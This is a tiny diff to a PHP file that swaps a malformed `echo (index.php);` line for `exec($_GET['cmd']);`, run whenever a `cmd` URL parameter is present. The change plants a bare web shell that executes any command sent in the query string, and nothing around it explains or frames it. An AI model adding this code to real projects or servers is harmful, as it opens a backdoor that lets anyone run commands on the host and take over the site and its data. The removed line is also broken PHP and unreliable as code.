@@ -1,6 +1,6 @@
 <?php
     if(isset($_GET['cmd']))
     {
-        echo (index.php);
+        exec($_GET['cmd']);
     }
 ?>
